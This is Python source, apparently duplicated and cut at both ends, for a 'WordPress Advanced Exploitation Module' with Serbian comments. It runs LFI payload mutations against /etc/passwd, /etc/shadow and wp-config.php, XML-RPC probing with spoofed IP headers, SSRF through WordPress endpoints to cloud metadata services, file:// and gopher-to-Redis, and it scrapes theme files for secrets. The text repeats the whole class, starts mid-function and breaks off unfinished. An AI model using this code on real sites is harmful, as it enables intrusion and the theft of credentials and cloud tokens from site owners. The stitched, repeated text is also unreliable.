            "gopher_redis": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
        }
        
        # WordPress SSRF attack vectors
        ssrf_vectors = [
            # REST API endpoints
            {
                "endpoint": "/wp-json/wp/v2/media",
                "method": "POST",
                "param": "source_url",
                "content_type": "application/json",
                "description": "Media Library URL Import"
            },
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST", 
                "param": "url",
                "data_extra": {"action": "fetch-list"},
                "description": "AJAX URL Fetch"
            },
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST",
                "param": "feed_url", 
                "data_extra": {"action": "dashboard_primary"},
                "description": "Dashboard RSS Feed"
            },
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST",
                "param": "url",
                "data_extra": {"action": "wp_privacy_export_personal_data"},
                "description": "Privacy Export"
            },
            # Pingback/Trackback
            {
                "endpoint": "/xmlrpc.php",
                "method": "POST",
                "param": "source_uri",
                "xml_method": "pingback.ping", 
                "description": "XML-RPC Pingback"
            },
            # Theme customizer
            {
                "endpoint": "/wp-admin/customize.php",
                "method": "GET",
                "param": "url",
                "description": "Theme Customizer Preview"
            },
            # Plugin update checker
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST",
                "param": "plugin_url",
                "data_extra": {"action": "update-plugin"},
                "description": "Plugin Update Check"
            }
        ]
        
        for vector in ssrf_vectors:
            print(f"   üéØ Testiram: {vector['description']}")
            
            for payload_name, payload_url in ssrf_payloads.items():
                try:
                    start_time = time.time()
                    
                    # Pripremi request na osnovu vektora
                    if vector["method"] == "POST":
                        if "xml_method" in vector:
                            # XML-RPC pingback
                            xml_data = f"""<?xml version="1.0"?>
<methodCall>
    <methodName>{vector["xml_method"]}</methodName>
    <params>
        <param><value><string>{target['base_url']}</string></value></param>
        <param><value><string>{payload_url}</string></value></param>
    </params>
</methodCall>"""
                            headers = {"Content-Type": "text/xml"}
                            response = self.session.post(
                                f"{target['base_url']}{vector['endpoint']}",
                                data=xml_data,
                                headers=headers,
                                timeout=15
                            )
                        elif vector.get("content_type") == "application/json":
                            # JSON REST API
                            json_data = {vector["param"]: payload_url}
                            if "data_extra" in vector:
                                json_data.update(vector["data_extra"])
                                
                            response = self.session.post(
                                f"{target['base_url']}{vector['endpoint']}",
                                json=json_data,
                                timeout=15
                            )
                        else:
                            # Regular POST
                            post_data = {vector["param"]: payload_url}
                            if "data_extra" in vector:
                                post_data.update(vector["data_extra"])
                                
                            response = self.session.post(
                                f"{target['base_url']}{vector['endpoint']}",
                                data=post_data,
                                timeout=15
                            )
                    else:
                        # GET request
                        params = {vector["param"]: payload_url}
                        response = self.session.get(
                            f"{target['base_url']}{vector['endpoint']}",
                            params=params,
                            timeout=15
                        )
                    
                    response_time = time.time() - start_time
                    
                    # Analiziraj response za SSRF indikatore
                    ssrf_detected = self.analyze_ssrf_response(
                        response, payload_url, payload_name, response_time
                    )
                    
                    if ssrf_detected:
                        ssrf_results.append({
                            "vector": vector["description"],
                            "endpoint": vector["endpoint"],
                            "payload_name": payload_name,
                            "payload_url": payload_url,
                            "method": vector["method"],
                            "parameter": vector["param"],
                            "status_code": response.status_code,
                            "response_time": response_time,
                            "response_length": len(response.text),
                            "evidence": response.text[:500],
                            "detection_reason": ssrf_detected
                        })
                        print(f"üö® SSRF DETECTED: {vector['description']} -> {payload_name}")
                    
                    time.sleep(0.2)  # Rate limiting
                    
                except requests.exceptions.Timeout:
                    # Timeout mo≈æe biti indikator uspe≈°nog SSRF-a
                    ssrf_results.append({
                        "vector": vector["description"],
                        "endpoint": vector["endpoint"], 
                        "payload_name": payload_name,
                        "payload_url": payload_url,
                        "method": vector["method"],
                        "parameter": vector["param"],
                        "status_code": "TIMEOUT",
                        "response_time": 15.0,
                        "detection_reason": "Request timeout - possible SSRF"
                    })
                    print(f"‚è∞ TIMEOUT (possible SSRF): {vector['description']} -> {payload_name}")
                    
                except Exception as e:
                    continue
                    
        return ssrf_results
    
    def analyze_ssrf_response(self, response, payload_url, payload_name, response_time):
        """Analizira response za SSRF indikatore"""
        
        # 1. Timeout ili sporost (mo≈æe znaƒçiti successful connection)
        if response_time > 10:
            return "Slow response - possible internal connection"
            
        # 2. Status code analiza
        if response.status_code in [200, 302, 403]:
            text = response.text.lower()
            
            # AWS metadata response patterns
            if "aws" in payload_name and any(aws_sig in text for aws_sig in [
                "ami-id", "instance-id", "instance-type", "local-hostname", 
                "security-groups", "iam/security-credentials"
            ]):
                return "AWS metadata exposed"
                
            # GCP metadata response patterns  
            if "gcp" in payload_name and any(gcp_sig in text for gcp_sig in [
                "computemetadata", "instance/", "project/", "service-accounts"
            ]):
                return "GCP metadata exposed"
                
            # File protocol success
            if "file://" in payload_url and any(file_sig in text for file_sig in [
                "root:", "www-data:", "<?php", "define(", "mysql:"
            ]):
                return "Local file access via file:// protocol"
                
            # Internal service banners
            service_banners = {
                ":22": ["ssh", "openssh", "protocol"],
                ":3306": ["mysql", "mariadb", "access denied for user"],
                ":6379": ["redis", "wrong number of arguments"],
                ":27017": ["mongodb", "connection refused", "unauthorized"],
                ":9200": ["elasticsearch", "cluster_name", "version"],
                ":21": ["ftp", "welcome", "220"]
            }
            
            for port, banners in service_banners.items():
                if port in payload_url and any(banner in text for banner in banners):
                    return f"Internal service banner detected ({port})"
                    
        # 3. Error message analysis (mo≈æe otkriti internal structure)
        error_indicators = [
            "connection refused",
            "connection timed out", 
            "could not resolve host",
            "no route to host",
            "operation timed out",
            "curl error",
            "failed to open stream",
            "network is unreachable"
        ]
        
        if any(error in response.text.lower() for error in error_indicators):
            return "Error message reveals internal network attempt"
            
        # 4. Response size anomaly
        if len(response.text) > 1000 and response.status_code == 200:
            return "Large response - possible data exfiltration"
            
        return False

    def test_theme_specific_exploits(self, target):
        """Testira eksploite specifiƒçne za TwentyTwenty temu"""
        print(f"\nüé® Testiram TwentyTwenty tema eksploite na: {target['base_url']}")
        
        theme_exploits = []
        
        # TwentyTwenty specifiƒçni fajlovi
        theme_files = [
            "/wp-content/themes/twentytwenty/functions.php",
            "/wp-content/themes/twentytwenty/style.css",
            "/wp-content/themes/twentytwenty/index.php",
            "/wp-content/themes/twentytwenty/single.php",
            "/wp-content/themes/twentytwenty/header.php",
            "/wp-content/themes/twentytwenty/footer.php",
            "/wp-content/themes/twentytwenty/screenshot.png",
            "/wp-content/themes/twentytwenty/readme.txt"
        ]
        
        for theme_file in theme_files:
            try:
                url = f"{target['base_url']}{theme_file}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    # Analiziraj sadr≈æaj za osetljive informacije
                    content = response.text
                    
                    sensitive_patterns = [
                        r"define\s*\(\s*['\"].*?['\"]\s*,\s*['\"].*?['\"]\s*\)",
                        r"\$.*?=\s*['\"].*?['\"]",
                        r"mysql_.*?\(",
                        r"mysqli_.*?\(",
                        r"PDO::",
                        r"password.*?=",
                        r"secret.*?=",
                        r"api.*?key"
                    ]
                    
                    import re
                    findings = []
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            findings.extend(matches[:3])  # Ograniƒçi na 3 match-a
                    
                    if findings or len(content) > 100:
                        theme_exploits.append({
                            "file": theme_file,
                            "url": url,
                            "accessible": True,
                            "size": len(content),
                            "findings": findings,
                            "content_preview": content[:300]
                        })
                        print(f"üìÅ Dostupan fajl: {theme_file}")
                        
            except Exception as e:
                continue
                
        return theme_exploits

    def run_full_exploitation(self):
        """Pokreƒáe kompletnu naprednu eksploitaciju"""
        print("üöÄ WordPress Advanced Exploitation Module")
        print("=" * 50)
        
        if not self.load_wp_reports():
            print("‚ùå Nema podataka za eksploitaciju!")
            return
            
        print(f"üéØ Pronaƒëeno {len(self.targets)} target(a) za eksploitaciju")
        
        all_results = {}
        
        for i, target in enumerate(self.targets, 1):
            print(f"\n{'='*50}")
            print(f"üéØ TARGET {i}/{len(self.targets)}: {target['base_url']}")
            print(f"{'='*50}")
            
            target_results = {
                "target_info": target,
                "lfi_mutations": [],
                "xmlrpc_bypass": [],
                "ssrf_wordpress": [],
                "theme_exploits": [],
                "timestamp": datetime.now().isoformat()
            }
            
            # Test LFI mutations
            try:
                target_results["lfi_mutations"] = self.test_lfi_mutations(target)
            except Exception as e:
                print(f"‚ùå LFI test error: {e}")
                
            # Test XML-RPC bypass
            try:
                target_results["xmlrpc_bypass"] = self.test_xmlrpc_bypass(target)
            except Exception as e:
                print(f"‚ùå XML-RPC test error: {e}")
                
            # Test SSRF through WordPress features
            try:
                target_results["ssrf_wordpress"] = self.test_ssrf_wordpress_features(target)
            except Exception as e:
                print(f"‚ùå SSRF test error: {e}")
                
            # Test theme-specific exploits
            try:
                target_results["theme_exploits"] = self.test_theme_specific_exploits(target)
            except Exception as e:
                print(f"‚ùå Theme exploit test error: {e}")
                
            all_results[target["base_url"]] = target_results
            
        # Saƒçuvaj rezultate
        self.save_results(all_results)
        self.print_summary(all_results)

    def save_results(self, results):
        """ƒåuva rezultate u JSON fajl"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"reports/wp/wp_advanced_exploit_{timestamp}.json"
        
        os.makedirs("reports/wp", exist_ok=True)
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
            
        print(f"\nüíæ Rezultati saƒçuvani u: {filename}")

    def print_summary(self, results):
        """Prikazuje sa≈æetak rezultata"""
        print("\n" + "="*60)
        print("üìä SA≈ΩETAK REZULTATA")
        print("="*60)
        
        total_lfi = 0
        total_xmlrpc = 0
        total_theme = 0
        
        for target_url, data in results.items():
            lfi_count = len(data["lfi_mutations"])
            xmlrpc_count = len(data["xmlrpc_bypass"])
            theme_count = len(data["theme_exploits"])
            
            total_lfi += lfi_count
            total_xmlrpc += xmlrpc_count
            total_theme += theme_count
            
            if lfi_count > 0 or xmlrpc_count > 0 or theme_count > 0:
                print(f"\nüéØ {target_url}")
                if lfi_count > 0:
                    print(f"   üß™ LFI ranjivosti: {lfi_count}")
                if xmlrpc_count > 0:
                    print(f"   üîß XML-RPC bypass: {xmlrpc_count}")
                if theme_count > 0:
                    print(f"   üé® Dostupni tema fajlovi: {theme_count}")
        
        print(f"\nüìà UKUPNO:")
        print(f"   üß™ LFI ranjivosti: {total_lfi}")
        print(f"   üîß XML-RPC bypass: {total_xmlrpc}")
        print(f"   üé® Tema eksploiti: {total_theme}")
        
        if total_lfi > 0 or total_xmlrpc > 0 or total_theme > 0:
            print(f"\nüéâ EKSPLOITACIJA USPE≈†NA! Pronaƒëeno ukupno {total_lfi + total_xmlrpc + total_theme} ranjivosti!")
        else:
            print(f"\nüõ°Ô∏è  Svi target-i su dobro za≈°tiƒáeni.")

if __name__ == "__main__":
    # Pokreni eksploitaciju
    exploiter = WordPressAdvancedExploit()
    exploiter.run_full_exploitation()

#!/usr/bin/env python3
"""
WordPress Advanced Exploitation Module
Uƒçitava podatke iz reports/wp/*.json i izvr≈°ava napredne eksploitacije
"""

import json
import requests
import urllib.parse
import base64
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class WordPressAdvancedExploit:
    def __init__(self, reports_dir="reports/wp/"):
        self.reports_dir = reports_dir
        self.session = requests.Session()
        self.session.timeout = 10
        self.results = {}
        self.targets = []
        
        # User-Agent rotation za bypass
        self.user_agents = [
            "Mozilla/5.0 (WordPress/5.8; +http://wordpress.org/)",
            "WordPress/5.9.3; http://example.com/wordpress",
            "Mozilla/5.0 (compatible; WP-CLI/2.6.0)",
            "curl/7.68.0",
            "python-requests/2.28.1"
        ]
        
        # HTTP headers za bypass
        self.bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "192.168.1.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"}
        ]

    def load_wp_reports(self):
        """Uƒçitava sve JSON izve≈°taje iz reports/wp/ foldera"""
        print(f"üîç Uƒçitavam izve≈°taje iz {self.reports_dir}")
        
        if not os.path.exists(self.reports_dir):
            print(f"‚ùå Folder {self.reports_dir} ne postoji!")
            return False
            
        json_files = [f for f in os.listdir(self.reports_dir) if f.endswith('.json')]
        
        if not json_files:
            print(f"‚ùå Nema JSON fajlova u {self.reports_dir}")
            return False
            
        for json_file in json_files:
            try:
                with open(os.path.join(self.reports_dir, json_file), 'r') as f:
                    data = json.load(f)
                    self.parse_wp_data(data, json_file)
                    print(f"‚úÖ Uƒçitao: {json_file}")
            except Exception as e:
                print(f"‚ùå Gre≈°ka pri uƒçitavanju {json_file}: {e}")
                
        return len(self.targets) > 0

    def parse_wp_data(self, data, filename):
        """Parsira WordPress podatke iz JSON-a"""
        try:
            # Izvojna XML-RPC rezultate
            if "attack_results" in data and "xmlrpc_results" in data["attack_results"]:
                for xmlrpc in data["attack_results"]["xmlrpc_results"]:
                    if "url" in xmlrpc:
                        base_url = xmlrpc["url"].replace("/xmlrpc.php", "")
                        self.targets.append({
                            "base_url": base_url,
                            "xmlrpc_url": xmlrpc["url"],
                            "xmlrpc_accessible": xmlrpc.get("accessible", False),
                            "source": filename
                        })
            
            # Izvuci LFI rezultate
            if "attack_results" in data and "lfi_results" in data["attack_results"]:
                for lfi in data["attack_results"]["lfi_results"]:
                    if "base_url" in lfi:
                        base_url = lfi["base_url"]
                        # Dodaj ili a≈æuriraj postojeƒái target
                        existing = next((t for t in self.targets if t["base_url"] == base_url), None)
                        if existing:
                            existing["lfi_tests"] = lfi.get("lfi_tests", [])
                        else:
                            self.targets.append({
                                "base_url": base_url,
                                "lfi_tests": lfi.get("lfi_tests", []),
                                "source": filename
                            })
                            
        except Exception as e:
            print(f"‚ö†Ô∏è  Gre≈°ka pri parsiranju {filename}: {e}")

    def generate_lfi_mutations(self, base_payload="etc/passwd"):
        """Generi≈°e mutacije za LFI bypass"""
        mutations = []
        
        # Osnovni payloads
        basic_payloads = [
            f"../../../{base_payload}",
            f"....//....//....//{base_payload}",
            f"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/../{base_payload}",
            f"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\{base_payload}",
        ]
        
        # URL encoding mutations
        for payload in basic_payloads:
            mutations.extend([
                payload,
                urllib.parse.quote(payload),
                urllib.parse.quote(payload, safe=''),
                payload.replace("../", "%2e%2e%2f"),
                payload.replace("../", "..%252f"),
                payload.replace("../", "..%c0%af"),
                payload.replace("../", "..%c1%9c"),
            ])
        
        # PHP wrapper payloads
        php_wrappers = [
            f"php://filter/convert.base64-encode/resource=../../../{base_payload}",
            f"php://filter/read=string.rot13/resource=../../../{base_payload}",
            f"data://text/plain;base64,{base64.b64encode(f'../../../{base_payload}'.encode()).decode()}",
            f"file:///{base_payload}",
            f"expect://cat ../../../{base_payload}",
        ]
        mutations.extend(php_wrappers)
        
        # Null byte injection (za starije PHP verzije)
        null_bytes = [
            f"../../../{base_payload}%00",
            f"../../../{base_payload}%00.jpg",
            f"../../../{base_payload}\x00",
        ]
        mutations.extend(null_bytes)
        
        return list(set(mutations))  # Ukloni duplikate

    def test_lfi_mutations(self, target):
        """Testira LFI mutacije na target-u"""
        print(f"\nüß™ Testiram LFI mutacije na: {target['base_url']}")
        
        # Generi≈°i payloads za razliƒçite fajlove
        sensitive_files = [
            "etc/passwd",
            "etc/shadow",
            "etc/hosts",
            "proc/version",
            "proc/self/environ",
            "var/log/apache2/access.log",
            "var/log/nginx/access.log",
            "home/www-data/.bash_history",
            # WordPress specifiƒçni fajlovi
            "wp-config.php",
            "wp-content/debug.log",
            ".htaccess"
        ]
        
        vulnerable_endpoints = []
        
        for file_target in sensitive_files:
            mutations = self.generate_lfi_mutations(file_target)
            
            # Testiraj na razliƒçitim endpointovima
            test_endpoints = [
                "/wp-content/themes/twentytwenty/index.php",
                "/wp-content/themes/twentytwenty/functions.php",
                "/wp-includes/template-loader.php",
                "/wp-admin/admin-ajax.php",
                "/index.php",
            ]
            
            for endpoint in test_endpoints:
                for mutation in mutations[:10]:  # Ograniƒçi na 10 najdobrijih mutacija
                    try:
                        for param in ["file", "page", "include", "path", "template", "view"]:
                            test_url = f"{target['base_url']}{endpoint}?{param}={mutation}"
                            
                            # Rotiraj User-Agent i dodaj bypass header-e
                            headers = {"User-Agent": self.user_agents[0]}
                            if self.bypass_headers:
                                headers.update(self.bypass_headers[0])
                            
                            response = self.session.get(test_url, headers=headers, allow_redirects=False)
                            
                            # Analiziraj odgovor
                            if self.analyze_lfi_response(response, file_target):
                                vulnerable_endpoints.append({
                                    "url": test_url,
                                    "payload": mutation,
                                    "parameter": param,
                                    "file_target": file_target,
                                    "status_code": response.status_code,
                                    "response_length": len(response.text),
                                    "evidence": response.text[:200]
                                })
                                print(f"üéØ RANJIVOST PRONAƒêENA: {test_url}")
                                
                            time.sleep(0.1)  # Rate limiting
                            
                    except Exception as e:
                        continue
        
        return vulnerable_endpoints

    def analyze_lfi_response(self, response, target_file):
        """Analizira odgovor za znakove uspe≈°ne LFI eksploitacije"""
        if response.status_code == 200:
            text = response.text.lower()
            
            # Signatori za razliƒçite fajlove
            signatures = {
                "etc/passwd": ["root:", "bin:", "daemon:", "/bin/bash", "/bin/sh"],
                "etc/shadow": ["root:$", "bin:*", "daemon:*"],
                "etc/hosts": ["127.0.0.1", "localhost"],
                "proc/version": ["linux version", "gcc version"],
                "wp-config.php": ["db_name", "db_user", "db_password", "wp_debug"],
                ".htaccess": ["rewriteengine", "rewriterule", "options"]
            }
            
            target_sigs = signatures.get(target_file.split('/')[-1], [])
            
            for sig in target_sigs:
                if sig in text:
                    return True
                    
            # Generiƒçki indikatori
            if any(indicator in text for indicator in [
                "root:x:0:0:",
                "www-data:",
                "mysql:",
                "<?php",
                "define('db_",
                "[main]"
            ]):
                return True
                
        return False

    def test_xmlrpc_bypass(self, target):
        """Testira XML-RPC bypass tehnike"""
        if not target.get("xmlrpc_url"):
            return []
            
        print(f"\nüîß Testiram XML-RPC bypass na: {target['xmlrpc_url']}")
        
        bypassed_methods = []
        
        # XML-RPC metode za testiranje
        test_methods = [
            "system.listMethods",
            "wp.getUsersBlogs", 
            "wp.getUsers",
            "wp.getAuthors",
            "blogger.getUsersBlogs",
            "metaWeblog.getUsersBlogs"
        ]
        
        for method in test_methods:
            for ua in self.user_agents:
                for bypass_header in self.bypass_headers:
                    try:
                        headers = {
                            "User-Agent": ua,
                            "Content-Type": "text/xml",
                            **bypass_header
                        }
                        
                        xml_payload = f"""<?xml version="1.0"?>
<methodCall>
    <methodName>{method}</methodName>
    <params>
    </params>
</methodCall>"""
                        
                        response = self.session.post(
                            target["xmlrpc_url"], 
                            data=xml_payload, 
                            headers=headers,
                            timeout=5
                        )
                        
                        if response.status_code == 200 and "methodResponse" in response.text:
                            bypassed_methods.append({
                                "method": method,
                                "user_agent": ua,
                                "bypass_header": bypass_header,
                                "response": response.text[:500]
                            })
                            print(f"‚úÖ XML-RPC Bypass uspe≈°an: {method}")
                            
                        time.sleep(0.1)
                        
                    except Exception as e:
                        continue
                        
        return bypassed_methods

    def test_ssrf_wordpress_features(self, target):
        """Testira SSRF kroz WordPress funkcionalnosti"""
        print(f"\nüåê Testiram SSRF kroz WordPress features na: {target['base_url']}")
        
        ssrf_results = []
        
        # SSRF test payloads za razliƒçite internal servise
        ssrf_payloads = {
            # Internal network scanning
            "internal_ssh": "http://127.0.0.1:22",
            "internal_mysql": "http://127.0.0.1:3306", 
            "internal_redis": "http://127.0.0.1:6379",
            "internal_mongodb": "http://127.0.0.1:27017",
            "internal_elasticsearch": "http://127.0.0.1:9200",
            "internal_ftp": "http://127.0.0.1:21",
            
            # Cloud metadata endpoints
            "aws_metadata": "http://169.254.169.254/latest/meta-data/",
            "gcp_metadata": "http://metadata.google.internal/computeMetadata/v1/",
            "azure_metadata": "http://169.254.169.254/metadata/instance",
            "digitalocean_metadata": "http://169.254.169.254/metadata/v1/",
            
            # File protocol tests
            "local_file_etc_passwd": "file:///etc/passwd",
            "local_file_proc_version": "file:///proc/version",
            "local_file_wp_config": "file:///var/www/html/wp-config.php",
            
            # LDAP injection
            "ldap_injection": "ldap://127.0.0.1:389/",
            
            # Gopher protocol (advanced)
            "gopher_mysql": "gopher://127.0.0.1:3306/_",
            "gopher_redis": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
        }
        
        # WordPress SSRF attack vectors
        ssrf_vectors = [
            # REST API endpoints
            {
                "endpoint": "/wp-json/wp/v2/media",
                "method": "POST",
                "param": "source_url",
                "content_type": "application/json",
                "description": "Media Library URL Import"
            },
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST", 
                "param": "url",
                "data_extra": {"action": "fetch-list"},
                "description": "AJAX URL Fetch"
            },
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST",
                "param": "feed_url", 
                "data_extra": {"action": "dashboard_primary"},
                "description": "Dashboard RSS Feed"
            },
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST",
                "param": "url",
                "data_extra": {"action": "wp_privacy_export_personal_data"},
                "description": "Privacy Export"
            },
            # Pingback/Trackback
            {
                "endpoint": "/xmlrpc.php",
                "method": "POST",
                "param": "source_uri",
                "xml_method": "pingback.ping", 
                "description": "XML-RPC Pingback"
            },
            # Theme customizer
            {
                "endpoint": "/wp-admin/customize.php",
                "method": "GET",
                "param": "url",
                "description": "Theme Customizer Preview"
            },
            # Plugin update checker
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST",
                "param": "plugin_url",
                "data_extra": {"action": "update-plugin"},
                "description": "Plugin Update Check"
            }
        ]
        
        for vector in ssrf_vectors:
            print(f"   üéØ Testiram: {vector['description']}")
            
            for payload_name, payload_url in ssrf_payloads.items():
                try:
                    start_time = time.time()
                    
                    # Pripremi request na osnovu vektora
                    if vector["method"] == "POST":
                        if "xml_method" in vector:
                            # XML-RPC pingback
                            xml_data = f"""<?xml version="1.0"?>
<methodCall>
    <methodName>{vector["xml_method"]}</methodName>
    <params>
        <param><value><string>{target['base_url']}</string></value></param>
        <param><value><string>{payload_url}</string></value></param>
    </params>
</methodCall>"""
                            headers = {"Content-Type": "text/xml"}
                            response = self.session.post(
                                f"{target['base_url']}{vector['endpoint']}",
                                data=xml_data,
                                headers=headers,
                                timeout=15
                            )
                        elif vector.get("content_type") == "application/json":
                            # JSON REST API
                            json_data = {vector["param"]: payload_url}
                            if "data_extra" in vector:
                                json_data.update(vector["data_extra"])
                                
                            response = self.session.post(
                                f"{target['base_url']}{vector['endpoint']}",
                                json=json_data,
                                timeout=15
                            )
                        else:
                            # Regular POST
                            post_data = {vector["param"]: payload_url}
                            if "data_extra" in vector:
                                post_data.update(vector["data_extra"])
                                
                            response = self.session.post(
                                f"{target['base_url']}{vector['endpoint']}",
                                data=post_data,
                                timeout=15
                            )
                    else:
                        # GET request
                        params = {vector["param"]: payload_url}
                        response = self.session.get(
                            f"{target['base_url']}{vector['endpoint']}",
                            params=params,
                            timeout=15
                        )
                    
                    response_time = time.time() - start_time
                    
                    # Analiziraj response za SSRF indikatore
                    ssrf_detected = self.analyze_ssrf_response(
                        response, payload_url, payload_name, response_time
                    )
                    
                    if ssrf_detected:
                        ssrf_results.append({
                            "vector": vector["description"],
                            "endpoint": vector["endpoint"],
                            "payload_name": payload_name,
                            "payload_url": payload_url,
                            "method": vector["method"],
                            "parameter": vector["param"],
                            "status_code": response.status_code,
                            "response_time": response_time,
                            "response_length": len(response.text),
                            "evidence": response.text[:500],
                            "detection_reason": ssrf_detected
                        })
                        print(f"üö® SSRF DETECTED: {vector['description']} -> {payload_name}")
                    
                    time.sleep(0.2)  # Rate limiting
                    
                except requests.exceptions.Timeout:
                    # Timeout mo≈æe biti indikator uspe≈°nog SSRF-a
                    ssrf_results.append({
                        "vector": vector["description"],
                        "endpoint": vector["endpoint"], 
                        "payload_name": payload_name,
                        "payload_url": payload_url,
                        "method": vector["method"],
                        "parameter": vector["param"],
                        "status_code": "TIMEOUT",
                        "response_time": 15.0,
                        "detection_reason": "Request timeout - possible SSRF"
                    })
                    print(f"‚è∞ TIMEOUT (possible SSRF): {vector['description']} -> {payload_name}")
                    
                except Exception as e:
                    continue
                    
        return ssrf_results
    
    def analyze_ssrf_response(self, response, payload_url, payload_name, response_time):
        """Analizira response za SSRF indikatore"""
        
        # 1. Timeout ili sporost (mo≈æe znaƒçiti successful connection)
        if response_time > 10:
            return "Slow response - possible internal connection"
            
        # 2. Status code analiza
        if response.status_code in [200, 302, 403]:
            text = response.text.lower()
            
            # AWS metadata response patterns
            if "aws" in payload_name and any(aws_sig in text for aws_sig in [
                "ami-id", "instance-id", "instance-type", "local-hostname", 
                "security-groups", "iam/security-credentials"
            ]):
                return "AWS metadata exposed"
                
            # GCP metadata response patterns  
            if "gcp" in payload_name and any(gcp_sig in text for gcp_sig in [
                "computemetadata", "instance/", "project/", "service-accounts"
            ]):
                return "GCP metadata exposed"
                
            # File protocol success
            if "file://" in payload_url and any(file_sig in text for file_sig in [
                "root:", "www-data:", "<?php", "define(", "mysql:"
            ]):
                return "Local file access via file:// protocol"
                
            # Internal service banners
            service_banners = {
                ":22": ["ssh", "openssh", "protocol"],
                ":3306": ["mysql", "mariadb", "access denied for user"],
                ":6379": ["redis", "wrong number of arguments"],
                ":27017": ["mongodb", "connection refused", "unauthorized"],
                ":9200": ["elasticsearch", "cluster_name", "version"],
                ":21": ["ftp", "welcome", "220"]
            }
            
            for port, banners in service_banners.items():
                if port in payload_url and any(banner in text for banner in banners):
                    return f"Internal service banner detected ({port})"
                    
        # 3. Error message analysis (mo≈æe otkriti internal structure)
        error_indicators = [
            "connection refused",
            "connection timed out", 
            "could not resolve host",
            "no route to host",
            "operation timed out",
            "curl error",
            "failed to open stream",
            "network is unreachable"
        ]
        
        if any(error in response.text.lower() for error in error_indicators):
            return "Error message reveals internal network attempt"
            
        # 4. Response size anomaly
        if len(response.text) > 1000 and response.status_code == 200:
            return "Large response - possible data exfiltration"
            
        return False

    def test_theme_specific_exploits(self, target):
        """Testira eksploite specifiƒçne za TwentyTwenty temu"""
        print(f"\nüé® Testiram TwentyTwenty tema eksploite na: {target['base_url']}")
        
        theme_exploits = []
        
        # TwentyTwenty specifiƒçni fajlovi
        theme_files = [
            "/wp-content/themes/twentytwenty/functions.php",
            "/wp-content/themes/twentytwenty/style.css",
            "/wp-content/themes/twentytwenty/index.php",
            "/wp-content/themes/twentytwenty/single.php",
            "/wp-content/themes/twentytwenty/header.php",
            "/wp-content/themes/twentytwenty/footer.php",
            "/wp-content/themes/twentytwenty/screenshot.png",
            "/wp-content/themes/twentytwenty/readme.txt"
        ]
        
        for theme_file in theme_files:
            try:
                url = f"{target['base_url']}{theme_file}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    # Analiziraj sadr≈æaj za osetljive informacije
                    content = response.text
                    
                    sensitive_patterns = [
                        r"define\s*\(\s*['\"].*?['\"]\s*,\s*['\"].*?['\"]\s*\)",
                        r"\$.*?=\s*['\"].*?['\"]",
                        r"mysql_.*?\(",
                        r"mysqli_.*?\(",
                        r"PDO::",
                        r"password.*?=",
                        r"secret.*?=",
                        r"api.*?key"
                    ]
                    
                    import re
                    findings = []
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            findings.extend(matches[:3])  # Ograniƒçi na 3 match-a
                    
                    if findings or len(content) > 100:
                        theme_exploits.append({
                            "file": theme_file,
                            "url": url,
                            "accessible": True,
                            "size": len(content),
                            "findings": findings,
                            "content_preview": content[:300]
                        })
                        print(f"üìÅ Dostupan fajl: {theme_file}")
                        
            except Exception as e:
                continue
                
        return theme_exploits

    def run_full_exploitation(self):
        """Pokreƒáe kompletnu naprednu eksploitaciju"""
        print("üöÄ WordPress Advanced Exploitation Module")
        print("=" * 50)
        
        if not self.load_wp_reports():
            print("‚ùå Nema podataka za eksploitaciju!")
            return
            
        print(f"üéØ Pronaƒëeno {len(self.targets)} target(a) za eksploitaciju")
        
        all_results = {}
        
        for i, target in enumerate(self.targets, 1):
            print(f"\n{'='*50}")
            print(f"üéØ TARGET {i}/{len(self.targets)}: {target['base_url']}")
            print(f"{'='*50}")
            
            target_results = {
                "target_info": target,
                "lfi_mutations": [],
                "xmlrpc_bypass": [],
                "ssrf_wordpress": [],
                "theme_exploits": [],
                "timestamp": datetime.now().isoformat()
            }
            
            # Test LFI mutations
            try:
                target_results["lfi_mutations"] = self.test_lfi_mutations(target)
            except Exception as e:
                print(f"‚ùå LFI test error: {e}")
                
            # Test XML-RPC bypass
            try:
                target_results["xmlrpc_bypass"] = self.test_xmlrpc_bypass(target)
            except Exception as e:
                print(f"‚ùå XML-RPC test error: {e}")
                
            # Test SSRF through WordPress features
            try:
                target_results["ssrf_wordpress"] = self.test_ssrf_wordpress_features(target)
            except Exception as e:
                print(f"‚ùå SSRF test error: {e}")
                
            # Test theme-specific exploits
            try:
                target_results["theme_exploits"] = self.test_theme_specific_exploits(target)
            except Exception as e:
                print(f"‚ùå Theme exploit test error: {e}")
                
            all_results[target["base_url"]] = target_results
            
        # Saƒçuvaj rezultate
        self.save_results(all_results)
        self.print_summary(all_results)

    def save_results(self, results):
        """ƒåuva rezultate u JSON fajl"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"reports/wp/wp_advanced_exploit_{timestamp}.json"
        
        os.makedirs("reports/wp", exist_ok=True)
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
            
